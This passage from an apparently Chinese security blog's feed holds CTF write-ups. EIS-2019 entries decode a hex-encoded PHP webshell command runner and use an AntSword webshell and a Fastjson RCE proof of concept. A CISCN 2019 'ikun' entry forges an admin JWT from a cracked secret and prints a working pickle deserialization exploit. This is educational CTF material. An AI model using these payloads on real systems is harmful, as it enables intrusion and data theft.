class="number">0x29</span>,<span class="number">0x3d</span>,<span class="number">0x3d</span>,<span class="number">0x22</span>,<span class="number">0x2f</span>,<span class="number">0x22</span>,<span class="number">0x3f</span>,<span class="number">0x22</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x20</span>,<span class="number">0x5c</span>,<span class="number">0x22</span>,<span class="number">0x7b</span>,<span class="number">0x24</span>,<span class="number">0x73</span>,<span class="number">0x7d</span>,<span class="number">0x5c</span>,<span class="number">0x22</span>,<span class="number">0x22</span>,<span class="number">0x3a</span>,<span class="number">0x22</span>,<span class="number">0x2f</span>,<span class="number">0x63</span>,<span class="number">0x20</span>,<span class="number">0x5c</span>,<span class="number">0x22</span>,<span class="number">0x7b</span>,<span class="number">0x24</span>,<span class="number">0x73</span>,<span class="number">0x7d</span>,<span class="number">0x5c</span>,<span class="number">0x22</span>,<span class="number">0x22</span>,<span class="number">0x3b</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x3d</span>,<span class="number">0x22</span>,<span class="number">0x7b</span>,<span class="number">0x24</span>,<span class="number">0x70</span>,<span class="number">0x7d</span>,<span class="number">0x20</span>,<span class="number">0x7b</span>,<span class="number">0x24</span>,<span class="number">0x63</span>,<span class="number">0x7d</span>,<span class="number">0x22</span>,<span class="number">0x3b</span>,<span class="number">0x66</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>,<span class="number">0x63</span>,<span class="number">0x74</span>,<span class="number">0x69</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x66</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x24</span>,<span class="number">0x64</span>,<span class="number">0x3d</span>,<span class="number">0x65</span>,<span class="number">0x78</span>,<span class="number">0x70</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x22</span>,<span class="number">0x2c</span>,<span class="number">0x22</span>,<span class="number">0x2c</span>,<span class="number">0x40</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x69</span>,<span class="number">0x5f</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x28</span>,<span class="number">0x22</span>,<span class="number">0x64</span>,<span class="number">0x69</span>,<span class="number">0x73</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x6c</span>,<span class="number">0x65</span>,<span class="number">0x5f</span>,<span class="number">0x66</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>,<span class="number">0x63</span>,<span class="number">0x74</span>,<span class="number">0x69</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>,<span class="number">0x22</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x69</span>,<span class="number">0x66</span>,<span class="number">0x28</span>,<span class="number">0x65</span>,<span class="number">0x6d</span>,<span class="number">0x70</span>,<span class="number">0x74</span>,<span class="number">0x79</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x64</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x24</span>,<span class="number">0x64</span>,<span class="number">0x3d</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x79</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x7b</span>,<span class="number">0x24</span>,<span class="number">0x64</span>,<span class="number">0x3d</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x79</span>,<span class="number">0x5f</span>,<span class="number">0x6d</span>,<span class="number">0x61</span>,<span class="number">0x70</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x74</span>,<span class="number">0x72</span>,<span class="number">0x69</span>,<span class="number">0x6d</span>,<span class="number">0x27</span>,<span class="number">0x2c</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x79</span>,<span class="number">0x5f</span>,<span class="number">0x6d</span>,<span class="number">0x61</span>,<span class="number">0x70</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x72</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x77</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x27</span>,<span class="number">0x2c</span>,<span class="number">0x24</span>,<span class="number">0x64</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x75</span>,<span class="number">0x72</span>,<span class="number">0x6e</span>,<span class="number">0x28</span>,<span class="number">0x66</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>,<span class="number">0x63</span>,<span class="number">0x74</span>,<span class="number">0x69</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x5f</span>,<span class="number">0x65</span>,<span class="number">0x78</span>,<span class="number">0x69</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x66</span>,<span class="number">0x29</span>,<span class="number">0x26</span>,<span class="number">0x26</span>,<span class="number">0x69</span>,<span class="number">0x73</span>,<span class="number">0x5f</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x6c</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x66</span>,<span class="number">0x29</span>,<span class="number">0x26</span>,<span class="number">0x26</span>,<span class="number">0x21</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x5f</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x79</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x66</span>,<span class="number">0x2c</span>,<span class="number">0x24</span>,<span class="number">0x64</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x3b</span>,<span class="number">0x66</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>,<span class="number">0x63</span>,<span class="number">0x74</span>,<span class="number">0x69</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x72</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>,<span class="number">0x63</span>,<span class="number">0x6d</span>,<span class="number">0x64</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x63</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x3d</span>,<span class="number">0x30</span>,<span class="number">0x3b</span>,<span class="number">0x69</span>,<span class="number">0x66</span>,<span class="number">0x28</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x73</span>,<span class="number">0x79</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x6d</span>,<span class="number">0x27</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x40</span>,<span class="number">0x73</span>,<span class="number">0x79</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x6d</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x63</span>,<span class="number">0x2c</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x69</span>,<span class="number">0x66</span>,<span class="number">0x28</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x70</span>,<span class="number">0x61</span>,<span class="number">0x73</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x68</span>,<span class="number">0x72</span>,<span class="number">0x75</span>,<span class="number">0x27</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x40</span>,<span class="number">0x70</span>,<span class="number">0x61</span>,<span class="number">0x73</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x68</span>,<span class="number">0x72</span>,<span class="number">0x75</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x63</span>,<span class="number">0x2c</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x69</span>,<span class="number">0x66</span>,<span class="number">0x28</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x6c</span>,<span class="number">0x5f</span>,<span class="number">0x65</span>,<span class="number">0x78</span>,<span class="number">0x65</span>,<span class="number">0x63</span>,<span class="number">0x27</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x70</span>,<span class="number">0x72</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x74</span>,<span class="number">0x28</span>,<span class="number">0x40</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x6c</span>,<span class="number">0x5f</span>,<span class="number">0x65</span>,<span class="number">0x78</span>,<span class="number">0x65</span>,<span class="number">0x63</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x63</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x69</span>,<span class="number">0x66</span>,<span class="number">0x28</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x65</span>,<span class="number">0x78</span>,<span class="number">0x65</span>,<span class="number">0x63</span>,<span class="number">0x27</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x40</span>,<span class="number">0x65</span>,<span class="number">0x78</span>,<span class="number">0x65</span>,<span class="number">0x63</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x63</span>,<span class="number">0x2c</span>,<span class="number">0x24</span>,<span class="number">0x6f</span>,<span class="number">0x2c</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x70</span>,<span class="number">0x72</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x74</span>,<span class="number">0x28</span>,<span class="number">0x6a</span>,<span class="number">0x6f</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x28</span>,<span class="number">0x22</span>,<span class="number">0xa</span>,<span class="number">0x22</span>,<span class="number">0x2c</span>,<span class="number">0x24</span>,<span class="number">0x6f</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x69</span>,<span class="number">0x66</span>,<span class="number">0x28</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x70</span>,<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x27</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x24</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x3d</span>,<span class="number">0x40</span>,<span class="number">0x70</span>,<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x63</span>,<span class="number">0x2c</span>,<span class="number">0x27</span>,<span class="number">0x72</span>,<span class="number">0x27</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x77</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,<span class="number">0x6c</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x21</span>,<span class="number">0x40</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x6f</span>,<span class="number">0x66</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x70</span>,<span class="number">0x72</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x74</span>,<span class="number">0x28</span>,<span class="number">0x40</span>,<span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x2c</span>,<span class="number">0x20</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0x34</span>,<span class="number">0x38</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x40</span>,<span class="number">0x70</span>,<span class="number">0x63</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x69</span>,<span class="number">0x66</span>,<span class="number">0x28</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x79</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x6d</span>,<span class="number">0x27</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x40</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x79</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x6d</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x63</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x7b</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x20</span>,<span class="number">0x3d</span>,<span class="number">0x20</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x37</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x75</span>,<span class="number">0x72</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x3b</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x3d</span>,<span class="number">0x40</span>,<span class="number">0x72</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>,<span class="number">0x63</span>,<span class="number">0x6d</span>,<span class="number">0x64</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x2e</span>,<span class="number">0x22</span>,<span class="number">0x20</span>,<span class="number">0x32</span>,<span class="number">0x3e</span>,<span class="number">0x26</span>,<span class="number">0x31</span>,<span class="number">0x22</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x70</span>,<span class="number">0x72</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x74</span>,<span class="number">0x20</span>,<span class="number">0x28</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x21</span>,<span class="number">0x3d</span>,<span class="number">0x30</span>,<span class="number">0x29</span>,<span class="number">0x3f</span>,<span class="number">0x22</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x3d</span>,<span class="number">0x7b</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x7d</span>,<span class="number">0x22</span>,<span class="number">0x3a</span>,<span class="number">0x22</span>,<span class="number">0x22</span>,<span class="number">0x3b</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x63</span>,<span class="number">0x68</span>,<span class="number">0x28</span>,<span class="number">0x45</span>,<span class="number">0x78</span>,<span class="number">0x63</span>,<span class="number">0x65</span>,<span class="number">0x70</span>,<span class="number">0x74</span>,<span class="number">0x69</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x24</span>,<span class="number">0x65</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x65</span>,<span class="number">0x63</span>,<span class="number">0x68</span>,<span class="number">0x6f</span>,<span class="number">0x20</span>,<span class="number">0x22</span>,<span class="number">0x45</span>,<span class="number">0x52</span>,<span class="number">0x52</span>,<span class="number">0x4f</span>,<span class="number">0x52</span>,<span class="number">0x3a</span>,<span class="number">0x2f</span>,<span class="number">0x2f</span>,<span class="number">0x22</span>,<span class="number">0x2e</span>,<span class="number">0x24</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x3e</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x4d</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x73</span>,<span class="number">0x61</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x3b</span>,<span class="number">0x61</span>,<span class="number">0x73</span>,<span class="number">0x6f</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x70</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>,<span class="number">0x64</span>,<span class="number">0x69</span>,<span class="number">0x65</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x3b</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">    print(<span class="built_in">chr</span>(a[i]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>解码得</p><p><img src="https://oss.zjun.info/zjun.info/EIS-2019-CTF-WP-6.webp" alt="EIS-2019-CTF-WP-6"></p><p>使用key解码</p><p><img src="https://oss.zjun.info/zjun.info/EIS-2019-CTF-WP-7.webp" alt="EIS-2019-CTF-WP-7"></p><p><img src="https://oss.zjun.info/zjun.info/EIS-2019-CTF-WP-8.webp" alt="EIS-2019-CTF-WP-8"></p><h2 id="0x05-towcats"><a href="#0x05-towcats" class="headerlink" title="0x05 towcats"></a>0x05 towcats</h2><p>下载文件解压后发现两张相似图片但是大小不一致，猜测为盲水印。</p><p><img src="https://oss.zjun.info/zjun.info/EIS-2019-CTF-WP-9.webp" alt="EIS-2019-CTF-WP-9"></p><p>打开图片发现flag。</p><p><img src="https://oss.zjun.info/zjun.info/EIS-2019-CTF-WP-10.webp" alt="EIS-2019-CTF-WP-10"></p><h2 id="0x06-ezbypass"><a href="#0x06-ezbypass" class="headerlink" title="0x06 ezbypass"></a>0x06 ezbypass</h2><p>构造以下代码查看phpinfo可得被禁函数</p><p><img src="https://oss.zjun.info/zjun.info/EIS-2019-CTF-WP-11.webp" alt="EIS-2019-CTF-WP-11"></p><p>使用蚁剑构造代码连接</p><p><img src="https://oss.zjun.info/zjun.info/EIS-2019-CTF-WP-12.webp" alt="EIS-2019-CTF-WP-12"></p><p>使用插件</p><p> <img src="https://oss.zjun.info/zjun.info/EIS-2019-CTF-WP-13.webp" alt="EIS-2019-CTF-WP-13"></p><p>得到flag <img src="https://oss.zjun.info/zjun.info/EIS-2019-CTF-WP-14.webp" alt="EIS-2019-CTF-WP-14"></p><h2 id="0x08-ezjava"><a href="#0x08-ezjava" class="headerlink" title="0x08 ezjava"></a>0x08 ezjava</h2><p>该题目就是 Fastjson &lt;= 1.2.47 远程命令执行漏洞 。<br>下载poc:<br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a><br>参考:<br><a href="https://yaofeifly.github.io/2019/07/28/fastjson/">https://yaofeifly.github.io/2019/07/28/fastjson/</a> </p><h2 id="0x17-re1"><a href="#0x17-re1" class="headerlink" title="0x17 re1"></a>0x17 re1</h2><p>逆向可得是RC4算法<br>根据某大佬博客写出以下解密脚本</p><p><img src="https://oss.zjun.info/zjun.info/EIS-2019-CTF-WP-15.webp" alt="EIS-2019-CTF-WP-15"></p><p>即可获得flag</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>成功进入西南赛区前5，西安见。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> EIS-2019 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 华北赛区 Day1 Web2 ikun</title>
      <link href="2019/ciscn2019-day1-web2-ikun.html"/>
      <url>2019/ciscn2019-day1-web2-ikun.html</url>
      
        <content type="html"><![CDATA[<p>地址：<a href="https://buuoj.cn/">https://buuoj.cn</a><br>考点：</p><ul><li>逻辑漏洞</li><li>JWT</li><li>未授权访问</li><li>python反序列化</li></ul><p><img src="https://oss.zjun.info/zjun.info/ikun-1.webp" alt="ikun-1"></p><p>看到主页，一定要买到lv6</p><p><img src="https://oss.zjun.info/zjun.info/ikun-2.webp" alt="ikun-2"></p><p><img src="https://oss.zjun.info/zjun.info/ikun-3.webp" alt="ikun-3"></p><p>很多还有下一页，点击下一页后发现url的改变</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4cf0b42f-4999-42cb-8ea4-8be1be09e6ad.node3.buuoj.cn/shop?page=2</span><br></pre></td></tr></table></figure><p>于是测试了一下，总共有500页，写了个简单的脚本寻找lv6</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://4cf0b42f-4999-42cb-8ea4-8be1be09e6ad.node3.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">500</span>):</span><br><span class="line">    r=requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    sleep(<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最开始没写sleep，被封了IP，挂个代理跑了两分钟结果为181</p><p><img src="https://oss.zjun.info/zjun.info/ikun-4.webp" alt="ikun-4"></p><p>创建了一个账号，查看余额，远远不够买lv6</p><p><img src="https://oss.zjun.info/zjun.info/ikun-5.webp" alt="ikun-5"></p><p>burp抓个包看看</p><p><img src="https://oss.zjun.info/zjun.info/ikun-6.webp" alt="ikun-6"></p><p>有价格，折扣，改了价格会显示操作失败，于是改了折扣</p><p><img src="https://oss.zjun.info/zjun.info/ikun-7.webp" alt="ikun-7"></p><p>是一个重定向，浏览器如下显示，并有了后台地址<code>/b1g_m4mber</code>但是需要权限</p><p><img src="https://oss.zjun.info/zjun.info/ikun-8.webp" alt="ikun-8"></p><p>抓的包里还看到了JWT,拿去<a href="http://jwt.calebb.net/">解码</a></p><p><img src="https://oss.zjun.info/zjun.info/ikun-9.webp" alt="ikun-9"></p><p>正是刚才注册的id，就想着这里能不能未授权登陆管理员账号。<br><a href="https://github.com/brendan-rius/c-jwt-cracker">爆破</a>出JWT的key为1kun</p><p><img src="https://oss.zjun.info/zjun.info/ikun-10.webp" alt="ikun-10"></p><p>管理员的JWT，修改jwt字段往服务器发包</p><p><img src="https://oss.zjun.info/zjun.info/ikun-11.webp" alt="ikun-11"></p><p><img src="https://oss.zjun.info/zjun.info/ikun-12.webp" alt="ikun-12"></p><p>成功以管理员登陆</p><p><img src="https://oss.zjun.info/zjun.info/ikun-13.webp" alt="ikun-13"></p><p>先看了看管理员身份的个人中心</p><p><img src="https://oss.zjun.info/zjun.info/ikun-14.webp" alt="ikun-14"></p><p>一眼看出是unicode编码，本以为就要结束了，结果</p><p><img src="https://oss.zjun.info/zjun.info/ikun-15.webp" alt="ikun-15"></p><p>那就回到购买lv6页面，源码发现文件下载，分析。</p><p><img src="https://oss.zjun.info/zjun.info/ikun-16.webp" alt="ikun-16"></p><p>admin.py存在反序列化</p><p><img src="https://oss.zjun.info/zjun.info/ikun-17.png" alt="ikun-17"></p><p>附上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure><p>将生成的payload传给become传入服务器可成功回显flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> CTF </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> JWT </tag>
            
            <tag> WriteUp </tag>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-14287 sudo提权漏洞复现</title>
      <link href="2019/cve-2019-14287.html"/>
      <url>2019/cve-2019-14287.html</url>
      
